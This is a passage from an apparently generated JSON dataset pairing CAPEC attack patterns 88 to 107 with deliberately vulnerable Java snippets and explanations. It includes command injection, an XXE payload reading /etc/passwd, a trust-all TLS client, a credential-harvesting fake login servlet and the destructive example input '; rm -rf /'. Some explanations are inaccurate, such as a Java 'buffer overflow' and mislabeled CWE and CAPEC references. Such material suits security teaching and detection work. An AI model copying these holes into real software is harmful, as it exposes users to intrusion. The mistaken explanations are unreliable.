        "description": "This Java servlet code snippet demonstrates a basic implementation of access control for an admin panel. The servlet checks if the user has an active session and if the user's role is 'admin'. If these conditions are not met, the servlet returns a 403 Forbidden error. This code snippet embodies the main idea of the CAPEC 'Forceful Browsing' by showing how an attacker could potentially bypass access controls if they are not properly implemented. The related CWEs are addressed as follows: CWE-425 (Direct Request) is mitigated by checking the session and role, CWE-285 (Improper Authorization) is handled by verifying the user's role, and CWE-693 (Protection Mechanism Failure) is addressed by ensuring that the access control mechanism is in place. However, this code does not address CWE-598 (Use of GET Request Method With Sensitive Query Strings) and CWE-368 (Context Switching Race Condition), which would require additional measures."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class CommandInjectionExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java CommandInjectionExample <command>\");\n            return;\n        }\n\n        String userInput = args[0];\n        try {\n            // Vulnerable code: directly using user input in the command\n            String command = \"ls \" + userInput;\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a classic example of OS Command Injection vulnerability. The program takes a single command-line argument from the user and appends it directly to an 'ls' command string. This user input is then executed by the system's command line using `Runtime.getRuntime().exec()`. The code does not validate or sanitize the user input, making it susceptible to injection attacks. An attacker could provide malicious input such as `; rm -rf /` to execute arbitrary commands, potentially compromising the system. This example embodies the main idea of CAPEC-88 and related CWEs, particularly CWE-78 (OS Command Injection) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerablePharmingExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/download/malicious-code.jar\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n            connection.disconnect();\n\n            // Simulate execution of downloaded code\n            System.out.println(\"Downloaded content: \" + content.toString());\n\n            // CWE-346: Origin Validation Error\n            // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n            URL bankUrl = new URL(\"http://trustedbank.com\");\n            HttpURLConnection bankConnection = (HttpURLConnection) bankUrl.openConnection();\n            bankConnection.setRequestMethod(\"GET\");\n            BufferedReader bankIn = new BufferedReader(new InputStreamReader(bankConnection.getInputStream()));\n            String bankInputLine;\n            StringBuilder bankContent = new StringBuilder();\n            while ((bankInputLine = bankIn.readLine()) != null) {\n                bankContent.append(bankInputLine);\n            }\n            bankIn.close();\n            bankConnection.disconnect();\n\n            // CWE-602: Client-Side Enforcement of Server-Side Security\n            if (bankContent.toString().contains(\"<form action='http://trustedbank.com/login'>\")) {\n                System.out.println(\"This is a trusted bank site.\");\n            } else {\n                System.out.println(\"This is not a trusted bank site.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable scenario related to pharming attacks. The code first downloads content from a URL without performing any integrity checks (CWE-494). It then simulates accessing a supposedly trusted bank site but fails to properly validate the origin of the data (CWE-346) and relies on potentially spoofed DNS information (CWE-350). Additionally, it performs client-side validation to determine if the site is trusted, which is inherently insecure (CWE-602). This setup can lead to a situation where a user is tricked into interacting with a malicious site that appears to be legitimate, embodying the main idea of a pharming attack."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class ReflectionAttackExample {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        Socket clientSocket = serverSocket.accept();\n        BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n        PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n        // Read challenge from client\n        String challenge = in.readLine();\n        System.out.println(\"Received challenge: \" + challenge);\n\n        // Reflect the challenge back to the client\n        out.println(challenge);\n        System.out.println(\"Reflected challenge back to client\");\n\n        // Read response from client\n        String response = in.readLine();\n        System.out.println(\"Received response: \" + response);\n\n        // Incorrectly assume the client is authenticated\n        if (challenge.equals(response)) {\n            System.out.println(\"Client authenticated successfully\");\n        } else {\n            System.out.println(\"Authentication failed\");\n        }\n\n        clientSocket.close();\n        serverSocket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a simple authentication protocol that is vulnerable to a reflection attack. The server reads a challenge from the client and reflects it back. The client then sends the same challenge back as a response. The server incorrectly assumes that if the challenge and response match, the client is authenticated. This is a reflection attack vulnerability (CWE-301) because an attacker can simply reflect the challenge back to the server to gain unauthorized access. The code also highlights the incorrect implementation of the authentication algorithm (CWE-303) and the potential for authentication bypass by spoofing (CWE-290)."
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"imgSrc\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<img src='\" + userInput + \"' />\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to improper neutralization of script in attributes of IMG tags (CWE-82). The servlet takes a user-provided 'imgSrc' parameter and directly inserts it into an IMG tag's src attribute without any sanitization or validation. This can lead to Cross-Site Scripting (XSS) attacks if an attacker provides a malicious script as the 'imgSrc' parameter. The code also highlights issues related to improper neutralization of script-related HTML tags (CWE-80), incomplete denylist (CWE-692), and alternate XSS syntax (CWE-87)."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "public class IntegerOverflowExample {\n    public static void main(String[] args) {\n        int maxValue = Integer.MAX_VALUE;\n        int[] buffer = new int[10];\n\n        // Simulate user-controlled input that causes overflow\n        int userInput = 1;\n        int index = maxValue + userInput; // This causes an integer overflow\n\n        // Incorrect comparison leading to buffer overflow\n        if (index < buffer.length) {\n            buffer[index] = 42; // This will cause ArrayIndexOutOfBoundsException\n        }\n\n        // Unsigned to signed conversion error\n        long unsignedValue = 4294967295L; // Max unsigned 32-bit int\n        int signedValue = (int) unsignedValue; // This will wrap around to -1\n\n        System.out.println(\"Signed value: \" + signedValue);\n    }\n}",
        "description": "This Java code snippet demonstrates a forced integer overflow vulnerability. The main idea is to show how an integer overflow can lead to unexpected behavior, such as buffer overflows and incorrect comparisons. The code includes:\n\n1. An integer overflow when adding `userInput` to `maxValue`, causing `index` to wrap around to a negative value or a very small positive value.\n2. An incorrect comparison that leads to a buffer overflow when accessing the `buffer` array with an out-of-bounds index.\n3. An unsigned to signed conversion error, where a large unsigned value is cast to a signed integer, resulting in an unexpected negative value.\n\nThese issues can lead to serious vulnerabilities, including potential arbitrary code execution."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class LogInjectionExample {\n    private static final Logger logger = Logger.getLogger(LogInjectionExample.class.getName());\n\n    public static void main(String[] args) {\n        String userInput = \"User input with malicious content \\n[INFO] User logged in\";\n        logUserAction(userInput);\n    }\n\n    public static void logUserAction(String userInput) {\n        try (FileWriter fw = new FileWriter(\"application.log\", true)) {\n            // CWE-117: Improper Output Neutralization for Logs\n            // CWE-75: Failure to Sanitize Special Elements into a Different Plane\n            // CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences\n            // CWE-532: Insertion of Sensitive Information into Log File\n            // CWE-779: Logging of Excessive Data\n            fw.write(\"User action: \" + userInput + \"\\n\");\n        } catch (IOException e) {\n            logger.log(Level.SEVERE, \"Failed to write to log file\", e);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable logging mechanism that embodies the main idea of the CAPEC 'Log Injection-Tampering-Forging'. The `logUserAction` method writes user input directly to a log file without proper sanitization or neutralization of special characters. This can lead to log injection attacks where an attacker can manipulate log entries to mislead audits or cover their tracks. The code also highlights several related CWEs: improper output neutralization (CWE-117), failure to sanitize special elements (CWE-75), improper neutralization of escape sequences (CWE-150), insertion of sensitive information into log files (CWE-532), and logging of excessive data (CWE-779)."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "import javax.net.ssl.*;\nimport java.io.*;\nimport java.net.Socket;\n\npublic class VulnerableSSLClient {\n    public static void main(String[] args) throws Exception {\n        // Create an SSL context with default settings\n        SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n        sslContext.init(null, new TrustManager[]{new X509TrustManager() {\n            public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }\n            public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) { }\n            public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) { }\n        }}, new java.security.SecureRandom());\n\n        // Create an SSL socket to connect to the server\n        SSLSocketFactory factory = sslContext.getSocketFactory();\n        SSLSocket socket = (SSLSocket) factory.createSocket(\"example.com\", 443);\n\n        // Start handshake\n        socket.startHandshake();\n\n        // Send a simple HTTP request\n        PrintWriter out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())));\n        out.println(\"GET / HTTP/1.1\");\n        out.println(\"Host: example.com\");\n        out.println(\"\");\n        out.flush();\n\n        // Read the response\n        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        String inputLine;\n        while ((inputLine = in.readLine()) != null) {\n            System.out.println(inputLine);\n        }\n\n        // Close the streams and socket\n        in.close();\n        out.close();\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable SSL client that connects to a server without properly verifying the server's identity. The SSL context is initialized with a TrustManager that does not perform any checks on the server's certificate, making it susceptible to Man-in-the-Middle (MitM) attacks. This embodies the CAPEC 'Adversary in the Middle (AiTM)' by allowing an adversary to intercept and potentially alter the communication between the client and server. The related CWEs are represented as follows: CWE-300 (Channel Accessible by Non-Endpoint) due to the lack of proper verification of the server's identity, CWE-287 (Improper Authentication) because the client does not prove the server's identity, and CWE-290 (Authentication Bypass by Spoofing) as the client can be easily spoofed by an attacker."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "import javax.xml.ws.Service;\nimport javax.xml.namespace.QName;\nimport java.net.URL;\n\npublic class WSDLScanner {\n    public static void main(String[] args) {\n        try {\n            // URL of the WSDL file\n            URL wsdlURL = new URL(\"http://example.com/service?wsdl\");\n            // QName of the service\n            QName qname = new QName(\"http://example.com/\", \"ExampleService\");\n            // Create a service instance\n            Service service = Service.create(wsdlURL, qname);\n            // Access the service's port\n            ExampleService exampleService = service.getPort(ExampleService.class);\n            // Invoke a method with potentially malicious input\n            String response = exampleService.someMethod(\"<malicious>input</malicious>\");\n            System.out.println(\"Response: \" + response);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n\ninterface ExampleService {\n    String someMethod(String input);\n}",
        "description": "This Java code snippet demonstrates a basic WSDL scanning attack. The code accesses a WSDL file from a given URL, creates a service instance, and invokes a method on the service with potentially malicious input. This embodies the main idea of the CAPEC by showing how an attacker might use information from a WSDL file to interact with a web service and potentially exploit vulnerabilities. The code also touches on related CWEs by exposing sensitive information through the WSDL file and using potentially harmful input in service methods."
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class VulnerableLibraryAccess {\n    public static void main(String[] args) {\n        try {\n            // Attempt to load a library that may not be available on all systems\n            System.loadLibrary(\"nonexistentLibrary\");\n        } catch (UnsatisfiedLinkError e) {\n            // Improper error handling\n            System.out.println(\"Library not found, continuing execution...\");\n        }\n\n        // Attempt to read a file using a potentially prohibited method\n        try (FileInputStream fis = new FileInputStream(new File(\"/path/to/file\"))) {\n            byte[] data = new byte[1024];\n            int bytesRead = fis.read(data);\n            System.out.println(\"Read \" + bytesRead + \" bytes from file.\");\n        } catch (IOException e) {\n            // Improper error handling\n            System.out.println(\"File not found, continuing execution...\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the main idea of the CAPEC 'Block Access to Libraries' by attempting to load a library that may not be available on all systems and improperly handling the error. The code also includes an example of reading a file using a potentially prohibited method and again improperly handling the error. The lack of proper error handling can leave the system in an insecure state, which could be leveraged by an attacker. The code also touches on related CWEs such as 'Call to Non-ubiquitous API' (CWE-589) and 'Use of Prohibited Code' (CWE-1177) by using a library that may not exist on all platforms and a method that may be prohibited."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport javax.crypto.spec.IvParameterSpec;\nimport java.security.SecureRandom;\nimport java.util.Base64;\n\npublic class VulnerableCrypto {\n    public static void main(String[] args) throws Exception {\n        // Use of a broken or risky cryptographic algorithm (CWE-327)\n        String algorithm = \"DES\";\n        Cipher cipher = Cipher.getInstance(algorithm + \"/CBC/PKCS5Padding\");\n\n        // Generation of weak initialization vector (IV) (CWE-1204)\n        byte[] iv = new byte[8]; // DES uses 8-byte IV\n        new SecureRandom().nextBytes(iv);\n        IvParameterSpec ivSpec = new IvParameterSpec(iv);\n\n        // Use of a predictable algorithm in random number generator (CWE-1241)\n        KeyGenerator keyGen = KeyGenerator.getInstance(algorithm);\n        keyGen.init(56); // DES key size is 56 bits\n        SecretKey secretKey = keyGen.generateKey();\n\n        // Encrypting data\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivSpec);\n        String plaintext = \"Sensitive Data\";\n        byte[] ciphertext = cipher.doFinal(plaintext.getBytes());\n        System.out.println(\"Ciphertext: \" + Base64.getEncoder().encodeToString(ciphertext));\n\n        // Decrypting data\n        cipher.init(Cipher.DECRYPT_MODE, secretKey, ivSpec);\n        byte[] decryptedText = cipher.doFinal(ciphertext);\n        System.out.println(\"Decrypted Text: \" + new String(decryptedText));\n    }\n}",
        "description": "This Java code snippet demonstrates the use of a broken or risky cryptographic algorithm (DES) and the generation of a weak initialization vector (IV). DES is considered insecure due to its short key length (56 bits), making it vulnerable to brute-force attacks (CWE-327). The IV is generated using a predictable algorithm, which can compromise the security of the encryption (CWE-1241). The code also shows the encryption and decryption process using the DES algorithm in CBC mode with PKCS5 padding. This example embodies the main idea of CAPEC-189 (Cryptanalysis) by illustrating how weak cryptographic practices can lead to vulnerabilities that attackers can exploit to decipher ciphertext without knowing the secret key."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/phish\")\npublic class PhishingServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String redirectUrl = request.getParameter(\"url\");\n        if (redirectUrl != null && !redirectUrl.isEmpty()) {\n            response.sendRedirect(redirectUrl);\n        } else {\n            response.getWriter().println(\"<html><body>\");\n            response.getWriter().println(\"<h1>Login</h1>\");\n            response.getWriter().println(\"<form method='POST' action='/phish'>\");\n            response.getWriter().println(\"Username: <input type='text' name='username'><br>\");\n            response.getWriter().println(\"Password: <input type='password' name='password'><br>\");\n            response.getWriter().println(\"<input type='submit' value='Login'>\");\n            response.getWriter().println(\"</form>\");\n            response.getWriter().println(\"</body></html>\");\n        }\n    }\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String username = request.getParameter(\"username\");\n        String password = request.getParameter(\"password\");\n        // Simulate storing credentials\n        System.out.println(\"Phished credentials: \" + username + \", \" + password);\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Login Successful</h1>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a basic phishing attack. The servlet handles both GET and POST requests. In the GET request, it displays a fake login form to the user, which is a common phishing technique to gather credentials (CWE-451). The form submission is handled by the doPost method, which captures the username and password entered by the user and prints them to the console, simulating the theft of credentials. Additionally, the servlet includes an open redirect vulnerability (CWE-601) by accepting a 'url' parameter and redirecting the user to the specified URL without validation. This can be exploited to redirect users to malicious sites. The code embodies the main idea of phishing by masquerading as a legitimate login page to steal user credentials."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.validation.SchemaFactory;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlInput = \"<?xml version=\\\"1.0\\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]><foo>&xxe;</foo>\";\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            // Vulnerable code: No secure processing feature enabled\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new InputSource(new StringReader(xmlInput)));\n            System.out.println(doc.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that is susceptible to an XML External Entity (XXE) attack. The code does not enable secure processing features or validate the XML against a schema, which allows an attacker to include an external entity reference that can access sensitive files on the server (e.g., /etc/passwd). This embodies the main idea of the deprecated CAPEC-230 and CAPEC-231, as well as related CWEs such as CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-112 (Missing XML Validation)."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class BufferOverflowExample {\n    public static void main(String[] args) {\n        String filePath = \"input.txt\";\n        char[] buffer = new char[10]; // Fixed buffer size\n\n        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {\n            int charsRead = reader.read(buffer, 0, 50); // Attempt to read more than buffer size\n            System.out.println(\"Read \" + charsRead + \" characters.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability. The buffer is allocated with a fixed size of 10 characters, but the code attempts to read up to 50 characters into this buffer using the `BufferedReader.read` method. This can lead to a buffer overflow as the code does not check if the input size exceeds the buffer size. This example embodies the main idea of CAPEC-1000 (Overflow Buffers) and is related to CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableSSIServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n\n        // Vulnerable code: directly including user input in the response\n        out.println(\"<!--#include file='\" + userInput + \"' -->\");\n    }\n}",
        "description": "This Java servlet code demonstrates a Server Side Include (SSI) Injection vulnerability. The servlet takes a user-provided input from the HTTP request and directly includes it in the response as an SSI directive. This can allow an attacker to inject malicious SSI directives, leading to arbitrary code execution or information disclosure. The code does not properly neutralize or validate the user input (CWE-97, CWE-20), and it constructs part of the response using externally-influenced input without neutralizing special elements (CWE-74)."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableSessionSidejacking {\n    public static void main(String[] args) throws IOException {\n        URL url = new URL(\"http://example.com/login\"); // CWE-319: Cleartext Transmission of Sensitive Information\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n\n        String credentials = \"username=user&password=pass\"; // CWE-522: Insufficiently Protected Credentials\n        OutputStream os = connection.getOutputStream();\n        os.write(credentials.getBytes());\n        os.flush();\n        os.close();\n\n        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        String inputLine;\n        StringBuilder response = new StringBuilder();\n\n        while ((inputLine = in.readLine()) != null) {\n            response.append(inputLine);\n        }\n        in.close();\n\n        String sessionToken = connection.getHeaderField(\"Set-Cookie\"); // CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\n        System.out.println(\"Session Token: \" + sessionToken);\n\n        // Simulate using the session token in subsequent requests\n        URL protectedUrl = new URL(\"http://example.com/protected\");\n        HttpURLConnection protectedConnection = (HttpURLConnection) protectedUrl.openConnection();\n        protectedConnection.setRequestProperty(\"Cookie\", sessionToken); // CWE-294: Authentication Bypass by Capture-replay\n\n        BufferedReader protectedIn = new BufferedReader(new InputStreamReader(protectedConnection.getInputStream()));\n        String protectedInputLine;\n        StringBuilder protectedResponse = new StringBuilder();\n\n        while ((protectedInputLine = protectedIn.readLine()) != null) {\n            protectedResponse.append(protectedInputLine);\n        }\n        protectedIn.close();\n\n        System.out.println(\"Protected Response: \" + protectedResponse.toString());\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation that embodies the concept of session sidejacking. The code sends login credentials over an unencrypted HTTP connection (CWE-319: Cleartext Transmission of Sensitive Information), which can be intercepted by an attacker. The credentials are also insufficiently protected (CWE-522: Insufficiently Protected Credentials). After logging in, the session token is retrieved without the 'Secure' attribute (CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute), making it susceptible to being sent over an unencrypted channel. The session token is then used in a subsequent request, demonstrating how an attacker could perform an authentication bypass by replaying the captured session token (CWE-294: Authentication Bypass by Capture-replay). This code highlights the risks associated with unencrypted communication channels and insufficient protection of sensitive information, which are key aspects of session sidejacking."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class ClickjackingVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // CWE-1021: No X-Frame-Options header to prevent framing\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Welcome to the vulnerable page</h1>\");\n        response.getWriter().println(\"<button onclick=\\\"performSensitiveAction()\\\">Click me</button>\");\n        response.getWriter().println(\"<script>\");\n        response.getWriter().println(\"function performSensitiveAction() {\");\n        response.getWriter().println(\"  // CWE-368: Potential race condition in context switching\");\n        response.getWriter().println(\"  // CWE-115: Misinterpretation of input\");\n        response.getWriter().println(\"  alert('Sensitive action performed!');\");\n        response.getWriter().println(\"}\");\n        response.getWriter().println(\"</script>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a clickjacking vulnerability. The servlet generates an HTML page without setting the 'X-Frame-Options' header, which allows the page to be embedded in an iframe on a malicious site (CWE-1021). The page contains a button that, when clicked, performs a sensitive action. The script handling the button click could be exploited through a race condition (CWE-368) or misinterpretation of input (CWE-115). This setup can trick users into performing actions on the vulnerable site while they believe they are interacting with a different, attacker-controlled site."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class CrossZoneScriptingExample extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        String zone = request.getParameter(\"zone\");\n\n        // CWE-20: Improper Input Validation\n        if (zone == null || (!zone.equals(\"trusted\") && !zone.equals(\"untrusted\"))) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid zone\");\n            return;\n        }\n\n        // CWE-116: Improper Encoding or Escaping of Output\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Zone: \" + zone + \"</h1>\");\n        response.getWriter().println(\"<p>Input: \" + userInput + \"</p>\"); // No encoding or escaping\n        response.getWriter().println(\"</body></html>\");\n\n        // CWE-250: Execution with Unnecessary Privileges\n        if (zone.equals(\"trusted\")) {\n            executeWithHighPrivileges(userInput);\n        } else {\n            executeWithLowPrivileges(userInput);\n        }\n    }\n\n    private void executeWithHighPrivileges(String input) {\n        // High privilege execution\n        System.out.println(\"Executing with high privileges: \" + input);\n    }\n\n    private void executeWithLowPrivileges(String input) {\n        // Low privilege execution\n        System.out.println(\"Executing with low privileges: \" + input);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a Cross Zone Scripting vulnerability. The servlet processes user input and a 'zone' parameter, which indicates the security zone. The code has several weaknesses: \n\n1. **CWE-20: Improper Input Validation** - The 'zone' parameter is not properly validated, allowing potential bypass of security zones.\n2. **CWE-116: Improper Encoding or Escaping of Output** - User input is directly included in the HTML response without proper encoding or escaping, making it vulnerable to XSS attacks.\n3. **CWE-250: Execution with Unnecessary Privileges** - The code executes user input with high privileges if the 'zone' is 'trusted', which can be exploited if the 'zone' parameter is manipulated.\n\nThe main idea of the CAPEC is represented by the ability of an attacker to manipulate the 'zone' parameter to bypass security controls and execute code with elevated privileges, demonstrating a privilege elevation attack in a web-browser context."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        // Vulnerable code: does not neutralize CRLF sequences\n        response.setHeader(\"X-Custom-Header\", userInput);\n        response.getWriter().println(\"Header set with user input: \" + userInput);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to HTTP Request Splitting (CAPEC-33) and HTTP Request/Response Smuggling (CWE-444). The servlet takes a user input from an HTTP GET request parameter and directly sets it as a value in an HTTP response header without proper sanitization. This can be exploited by an attacker to inject CRLF sequences (CWE-113), leading to the injection of additional headers or even splitting the HTTP response. This vulnerability arises from improper neutralization of special elements (CWE-74, CWE-138) and inconsistent interpretation of HTTP requests (CWE-436)."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "import java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    private static final Logger logger = Logger.getLogger(VulnerableServlet.class.getName());\n\n    public VulnerableServlet() throws IOException {\n        FileHandler fh = new FileHandler(\"app.log\", true);\n        fh.setFormatter(new SimpleFormatter());\n        logger.addHandler(fh);\n    }\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        logger.info(\"User input: \" + userInput);\n\n        // Incomplete denylist for XSS\n        if (userInput.contains(\"<script>\")) {\n            userInput = userInput.replace(\"<script>\", \"\");\n        }\n\n        // Output user input directly to the web page\n        response.getWriter().println(\"User input: \" + userInput);\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability where user input is logged and then displayed on a web page without proper sanitization. The logger records user input, which could include malicious scripts, into a log file. The code attempts to use a denylist to prevent XSS by removing '<script>' tags, but this is incomplete and can be bypassed by other XSS vectors. The user input is then directly output to the web page, which can lead to Cross-Site Scripting (XSS) attacks. This snippet embodies the main idea of the deprecated CAPEC 'XSS through Log Files' by showing how improper handling of user input in logs and web pages can lead to security vulnerabilities."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String traceHeader = request.getHeader(\"TRACE\");\n        if (traceHeader != null) {\n            response.setContentType(\"text/html\");\n            response.getWriter().println(\"<html><body>\");\n            response.getWriter().println(\"TRACE header: \" + traceHeader);\n            response.getWriter().println(\"</body></html>\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to Cross Site Tracing (XST). The servlet reads the 'TRACE' header from the HTTP request and directly includes it in the HTTP response without any sanitization or validation. This can allow an attacker to steal session cookies or other sensitive information by exploiting the TRACE method. The code also touches on related CWEs: it fails to use proper protection mechanisms (CWE-693), incorrectly uses privileged APIs (CWE-648), and does not neutralize user input (CWE-79), making it susceptible to cross-site scripting (XSS) attacks."
    },
    {
        "capec_id": "108",
